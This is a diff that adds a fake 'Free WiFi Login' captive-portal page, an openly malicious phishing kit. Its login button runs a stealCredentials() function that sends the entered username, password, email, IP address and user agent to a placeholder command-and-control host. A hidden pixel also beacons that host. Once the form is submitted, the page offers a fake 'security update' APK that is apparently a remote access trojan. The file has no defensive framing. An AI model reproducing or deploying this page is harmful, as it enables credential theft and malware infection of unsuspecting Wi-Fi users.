@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free WiFi Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial; background: linear-gradient(45deg, #f06, #9f6); }
+        .container { max-width: 400px; margin: 100px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
+        .download-link { display: none; margin-top: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔒 WiFi Login Required</h2>
+        <p>Connection established. Please verify to continue...</p>
+        
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <input type="email" id="email" placeholder="Email (optional)">
+        
+        <button onclick="stealCredentials()">Connect to WiFi</button>
+        
+        <div id="download-section" class="download-link">
+            <p>✅ Verified! Download security update:</p>
+            <a id="apk-link" href="KiplayRat.apk" class="btn btn-success" download>📱 Download APK</a>
+        </div>
+        
+        <!-- Hidden pixel tracker -->
+        <img src="https://your-c2-server.com/track?ref=<?php echo $_SERVER['HTTP_REFERER']; ?>" style="display:none;">
+    </div>
+
+    <script>
+        function stealCredentials() {
+            const data = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                email: document.getElementById('email').value,
+                ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
+                userAgent: navigator.userAgent
+            };
+            
+            // Send to C2
+            fetch('https://your-c2-server.com/api/steal', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            
+            document.getElementById('download-section').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
